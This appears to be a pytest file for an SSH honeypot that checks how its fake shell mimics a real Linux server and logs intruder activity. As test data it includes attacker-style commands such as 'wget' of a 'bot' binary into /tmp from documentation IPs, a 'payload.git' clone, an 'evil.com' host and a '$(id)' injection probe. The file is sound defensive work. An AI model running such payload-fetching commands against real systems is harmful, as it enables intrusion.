"""Per-install values of the fake host: different secrets differ, one secret is stable."""

from __future__ import annotations

import base64
import hashlib
import re
import struct

import pytest

from ssh_sensor.config import Config
from ssh_sensor.shell.arith import ArithError, evaluate
from ssh_sensor.shell.baseimage import build_base_image, derive_profile
from ssh_sensor.shell.cmd_net import host_exists
from ssh_sensor.shell.interp import Shell
from ssh_sensor.shell.payload import elf_header, payload_for

K = b"test-key"


def make(seed: str) -> Shell:
    profile = derive_profile(seed, "srv-web01")
    return Shell(
        cfg=Config(command_delay=False),
        base=build_base_image(profile),
        profile=profile,
        username="root",
        client_ip="203.0.113.9",
        client_port=51000,
    )


def run(sh: Shell, line: str) -> str:
    return sh.run_line(line).output


def test_secret_derived_values_differ_and_are_stable() -> None:
    a, b, a2 = (derive_profile(s, "h") for s in ("secret-a", "secret-b", "secret-a"))
    for attr in (
        "user_hash",
        "ssh_key_line",
        "ssh_key_fingerprint",
        "db_password",
        "install_epoch",
    ):
        assert getattr(a, attr) == getattr(a2, attr)
        assert getattr(a, attr) != getattr(b, attr)


def test_shadow_hash_shape() -> None:
    h = derive_profile("secret-a", "h").user_hash
    assert re.fullmatch(r"\$y\$j9T\$[./0-9A-Za-z]{22}\$[./0-9A-Za-z]{43}", h)


def test_authorized_key_is_well_formed_and_matches_auth_log() -> None:
    sh = make("secret-a")
    kind, blob, comment = run(sh, "cat /home/ubuntu/.ssh/authorized_keys").split()
    raw = base64.b64decode(blob, validate=True)
    assert kind == "ssh-ed25519" and "@" in comment and "Placeholder" not in blob
    algo_len = struct.unpack(">I", raw[:4])[0]
    assert raw[4 : 4 + algo_len] == b"ssh-ed25519" and len(raw) == 4 + 11 + 4 + 32
    fp = "SHA256:" + base64.b64encode(hashlib.sha256(raw).digest()).decode().rstrip("=")
    assert fp in run(sh, "cat /var/log/auth.log") and len(fp) == 7 + 43
    assert "Wb4pp-2024!" not in run(sh, "cat /var/www/html/config.php")


def test_binaries_are_valid_elf_with_varied_sizes_and_mtimes() -> None:
    sh = make("secret-a")
    nodes = sh.base.nodes
    sizes = {nodes[f"/usr/bin/{n}"].length for n in ("cat", "ls", "grep", "sed", "tar")}
    mtimes = {nodes[f"/usr/bin/{n}"].mtime for n in ("cat", "ls", "grep", "sed", "tar")}
    assert len(sizes) == 5 and len(mtimes) > 1
    head = nodes["/usr/bin/cat"].content
    assert head[:4] == b"\x7fELF" and len(head) == 64
    assert struct.unpack_from("<H", head, 18)[0] == 0x3E  # e_machine x86-64
    assert len(sh.fs.read("/usr/bin/cat")) == nodes["/usr/bin/cat"].length
    other = make("secret-b").base.nodes["/usr/bin/cat"]
    assert other.content != head and other.length != nodes["/usr/bin/cat"].length
    # the bytes behind the header depend on the install secret too
    assert make("secret-a").fs.read("/usr/bin/cat") == sh.fs.read("/usr/bin/cat")
    assert make("secret-b").fs.read("/usr/bin/cat")[64:128] != sh.fs.read("/usr/bin/cat")[64:128]


def test_elf_header_is_deterministic() -> None:
    assert elf_header(K, "x", 5000) == elf_header(K, "x", 5000)
    assert elf_header(K, "x", 5000) != elf_header(K, "y", 5000)
    assert elf_header(K, "x", 5000) != elf_header(b"other", "x", 5000)


def test_ps_start_times_follow_boot() -> None:
    sh = make("secret-a")
    out = run(sh, "ps aux")
    assert "Oct12" not in out
    # daemons show the boot date, this session's processes the clock time
    import time

    boot = time.gmtime(sh.profile.boot_epoch)
    mon = time.strftime("%b", boot)
    assert f"{mon}{boot.tm_mday:02d}" in out
    line = next(ln for ln in out.splitlines() if "-bash" in ln)
    assert re.search(r"\d\d:\d\d", line)


@pytest.mark.parametrize(
    ("expr", "want"),
    [("7*6", 42), ("2+3*(4-1)", 11), ("-7/2", -3), ("-7%3", -1), (" 10 - -2 ", 12), ("", 0)],
)
def test_arith(expr: str, want: int) -> None:
    assert evaluate(expr, lambda _n: "") == want


@pytest.mark.parametrize(
    "expr", ["1/0", "1+", "(1", "1 2", "$(id)", "9" * 40, "(" * 100 + "1", "a b"]
)
def test_arith_rejects(expr: str) -> None:
    with pytest.raises(ArithError):
        evaluate(expr, lambda _n: "")


def test_arith_in_shell() -> None:
    sh = make("secret-a")
    assert run(sh, "echo $((7*6))") == "42\n"
    assert run(sh, "X=5; echo $((X*2+1)) $(($X-1))") == "11 4\n"


def test_unimplemented_binaries_behave_like_a_real_box() -> None:
    sh = make("secret-a")
    assert "You must specify one of the" in run(sh, "tar")
    assert sh.run_line("tar").status == 2
    assert sh.run_line("tar xzf nothing.tgz").status == 2
    assert sh.run_line("git").status == 1
    assert sh.run_line("git status").status == 128
    assert sh.run_line("nosuchtool").status == 127
    assert run(sh, "basename /a/b.txt .txt") == "b\n"
    assert run(sh, "seq 3") == "1\n2\n3\n"


@pytest.mark.parametrize(
    "host",
    ["foo.invalid", "a.test", "x.example", "x.localhost", "nodot", "a..b", "-a.com", "1.2.3.999"],
)
def test_dead_hosts(host: str) -> None:
    assert not host_exists(host)
    sh = make("secret-a")
    res = sh.run_line(f"wget http://{host}/x")
    assert res.status == 4 and "unable to resolve host address" in res.output
    assert not sh.fs.exists("/root/x")
    res = sh.run_line(f"curl -O http://{host}/x")
    assert res.status == 6 and "Could not resolve host" in res.output
    assert any(p.data["url"].startswith(f"http://{host}") for p in sh.pending)


def test_live_hosts_still_resolve() -> None:
    assert host_exists("example.com") and host_exists("203.0.113.5") and host_exists("a-b.c9.io")


def test_downloads_vary_with_url() -> None:
    a, b = payload_for(K, "http://203.0.113.5/a.sh"), payload_for(K, "http://203.0.113.5/b.sh")
    assert a.content.startswith(b"#!") and a.mime == "application/x-sh" and a.tag == "script"
    assert a.content != b.content
    e1, e2 = payload_for(K, "http://203.0.113.5/bot"), payload_for(K, "http://203.0.113.5/bot2")
    assert e1.content[:4] == b"\x7fELF" and e1.tag == "elf" and e1.size != e2.size
    assert e1.size > 64
    sh = make("secret-a")
    e1 = payload_for(sh.profile.payload_key, "http://203.0.113.5/bot")
    run(sh, "cd /tmp; wget -q http://203.0.113.5/bot")
    assert sh.fs.stat("/tmp/bot").length == e1.size  # type: ignore[union-attr]
    assert len(sh.fs.read("/tmp/bot")) == e1.size


def test_proc_self_and_coherence() -> None:
    sh = make("secret-a")
    pid = run(sh, "echo $$").strip()
    assert run(sh, "readlink /proc/self/exe") == "/usr/bin/bash\n"
    assert f"Pid:\t{pid}" in run(sh, "cat /proc/self/status")
    assert run(sh, "cat /proc/self/cmdline") == "-bash\x00"
    assert run(sh, "cat /proc/1/cmdline") == "/sbin/init\x00"
    cpuinfo = run(sh, "cat /proc/cpuinfo")
    assert cpuinfo.count("processor\t:") == int(run(sh, "nproc"))
    mem = re.search(r"MemTotal:\s+(\d+) kB", run(sh, "cat /proc/meminfo"))
    assert mem and mem.group(1) in run(sh, "free")
    assert sh.profile.kernel in run(sh, "cat /proc/version")
    assert sh.profile.kernel in run(sh, "uname -r")


def test_payload_differs_between_installs() -> None:
    url = "http://203.0.113.5/bot"
    assert payload_for(K, url).content != payload_for(b"other", url).content
    a, b = make("secret-a"), make("secret-b")
    for sh in (a, b):
        run(sh, "cd /tmp; wget -q " + url)
    assert a.fs.read("/tmp/bot") != b.fs.read("/tmp/bot")


def test_copy_and_move_of_binaries_keep_size_and_bytes() -> None:
    sh = make("secret-a")
    size = sh.fs.stat("/usr/bin/bash").length  # type: ignore[union-attr]
    assert run(sh, "cp /bin/bash /tmp/.x; echo $?") == "0\n"
    assert sh.fs.stat("/tmp/.x").length == size  # type: ignore[union-attr]
    assert run(sh, "sha256sum /bin/bash | cut -d' ' -f1") == run(
        sh, "sha256sum /tmp/.x | cut -d' ' -f1"
    )
    assert run(sh, "mv /tmp/.x /tmp/.y; echo $?") == "0\n"
    assert sh.fs.exists("/tmp/.y") and not sh.fs.exists("/tmp/.x")
    assert sh.fs.stat("/tmp/.y").length == size  # type: ignore[union-attr]


def test_failed_move_keeps_the_source() -> None:
    sh = make("secret-a")
    run(sh, "echo hi > /tmp/a")
    sh.fs._max_bytes = 0  # nothing more fits
    run(sh, "mv /tmp/a /tmp/b")
    assert sh.fs.exists("/tmp/a")


def test_reads_are_bounded_by_the_limit() -> None:
    from ssh_sensor.shell.fs import pad_content

    sh = make("secret-a")
    node = sh.base.nodes["/usr/bin/python3"]
    assert len(pad_content(sh.base.secret, node, 1000)) == 1000
    assert len(sh.fs.read("/usr/bin/python3", 100)) == 100


@pytest.mark.parametrize(
    "line",
    [
        "tar ''",
        "find " + "a" * 2000,
        "du " + "a" * 2000,
        "seq -- --5",
        "wget 'http://[x'",
        "curl 'http://[x'",
    ],
)
def test_bad_input_does_not_crash_the_shell(line: str) -> None:
    sh = make("secret-a")
    res = sh.run_line(line)
    assert "fork: retry" not in res.output


def test_bad_url_is_a_resolve_failure() -> None:
    sh = make("secret-a")
    res = sh.run_line("wget 'http://[x'")
    assert res.status == 4 and "unable to resolve host address" in res.output


def test_arith_division_by_zero_fails_the_command() -> None:
    sh = make("secret-a")
    res = sh.run_line("echo $((1/0)); echo after")
    assert 'division by 0 (error token is "0")' in res.output
    assert "after" in res.output
    res = sh.run_line("echo x$((1/0))")
    assert res.status == 1 and "x" not in res.output
    values = {int(run(sh, "echo $((RANDOM))")) for _ in range(20)}
    assert len(values) > 1 and all(0 <= v < 32768 for v in values)


def test_loopback_detection() -> None:
    from ssh_sensor.shell.cmd_net import _is_loopback

    assert _is_loopback("localhost") and _is_loopback("::1") and _is_loopback("127.0.0.5")
    assert not _is_loopback("127.evil.com") and not _is_loopback("203.0.113.5")
    assert "Name or service not known" not in run(make("secret-a"), "wget http://127.evil.com/x")


def test_git_clone_output() -> None:
    sh = make("secret-a")
    res = sh.run_line("git clone http://nope.invalid/repo.git")
    assert res.status == 128
    assert "Cloning into 'repo'..." in res.output
    assert (
        "fatal: unable to access 'http://nope.invalid/repo.git/': "
        "Could not resolve host: nope.invalid" in res.output
    )


def test_proc_lists_ps_pids_and_cwd_follows_cd() -> None:
    sh = make("secret-a")
    listing = run(sh, "ls /proc").split()
    for pid in ("1", "412", "702", "811", "903"):
        assert pid in listing
    assert run(sh, "cat /proc/811/comm") == "mysqld\n"
    assert run(sh, "readlink /proc/self/cwd") == "/root\n"
    run(sh, "cd /tmp")
    assert run(sh, "readlink /proc/self/cwd") == "/tmp\n"
    assert run(sh, "readlink /proc/$$/cwd") == "/tmp\n"


def test_git_clone_is_recorded_as_a_download_attempt() -> None:
    sh = make("secret-a")
    sh.run_line("git clone http://203.0.113.7/x/payload.git")
    events = [p for p in sh.pending if p.type == "download_attempt"]
    assert events and events[-1].data["url"] == "http://203.0.113.7/x/payload.git"
    assert events[-1].data["tool"] == "git"


@pytest.mark.parametrize(
    ("expr", "want"),
    [
        ("2**10", 1024),
        ("2**64", 0),
        ("2**3**2", 512),
        ("1<<62", 1 << 62),
        ("1<<64", 1),
        ("-1>>70", -1),
        ("0x10+010", 24),
        ("16#ff", 255),
        ("2#101", 5),
        ("-2**2", 4),
        (
            "3**100000000000",
            pow(3, 100000000000, 1 << 64)
            - (1 << 64 if pow(3, 100000000000, 1 << 64) >= 1 << 63 else 0),
        ),
    ],
)
def test_wide_arithmetic(expr: str, want: int) -> None:
    assert evaluate(expr, lambda _n: "") == want


@pytest.mark.parametrize(
    ("expr", "text"),
    [
        ("2**-1", 'exponent less than 0 (error token is "-1")'),
        ("1 +", 'syntax error: operand expected (error token is "+")'),
        ("08", 'value too great for base (error token is "08")'),
        ("1/0", 'division by 0 (error token is "0")'),
        ("1 $ 2", 'syntax error: operand expected (error token is "$ 2")'),
    ],
)
def test_arith_messages_use_bash_quoting(expr: str, text: str) -> None:
    with pytest.raises(ArithError) as err:
        evaluate(expr, lambda _n: "")
    assert str(err.value) == text


def test_arith_shell_message() -> None:
    out = make("secret-a").run_line("echo $((1 +))").output
    assert '1 +: syntax error: operand expected (error token is "+")' in out
    assert "'" not in out.split("error token")[1]
